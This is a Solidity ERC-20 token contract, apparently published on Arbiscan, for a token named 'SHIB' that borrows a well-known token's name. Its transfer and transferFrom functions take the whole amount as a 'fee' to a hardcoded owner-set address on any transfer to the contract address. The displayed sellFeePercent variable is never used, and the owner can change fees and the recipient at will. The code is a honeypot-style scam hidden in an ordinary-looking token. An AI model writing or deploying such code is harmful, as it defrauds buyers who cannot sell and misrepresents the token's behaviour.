/**
 *Submitted for verification at Arbiscan on 2023-07-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MyToken is IERC20, Ownable {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public buyFeePercent = 0;
    uint256 public sellFeePercent = 100;
    address payable public feeRecipient = payable(0x243B0ac3747c05ED22353284a052D082097d3FE1);

    constructor() {
        name = "SHIB";
        symbol = "SHIB";
        decimals = 18;
        _totalSupply = 1000000000 * 10**uint256(decimals);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        address sender = msg.sender;
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        uint256 fee = 0;
        if (recipient != address(this)) {
            // Not a sell
            fee = (amount * buyFeePercent) / 100;
        } else {
            // A sell
            fee = amount;
        }

        uint256 transferAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;
        _balances[feeRecipient] += fee;

        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, feeRecipient, fee);

        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        address owner = msg.sender;
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");
        require(
            _allowances[sender][msg.sender] >= amount,
            "ERC20: insufficient allowance"
        );

        uint256 fee = 0;
        if (recipient != address(this)) {
            // Not a sell
            fee = (amount * buyFeePercent) / 100;
        } else {
            // A sell
            fee = amount;
        }

        uint256 transferAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;
        _balances[feeRecipient] += fee;
        _allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, feeRecipient, fee);

        return true;
    }

    function setBuyFeePercent(uint256 newBuyFeePercent) public onlyOwner {
        buyFeePercent = newBuyFeePercent;
    }

    function setSellFeePercent(uint256 newSellFeePercent) public onlyOwner {
        sellFeePercent = newSellFeePercent;
    }

    function setFeeRecipient(address payable newFeeRecipient) public onlyOwner {
        feeRecipient = newFeeRecipient;
    }
}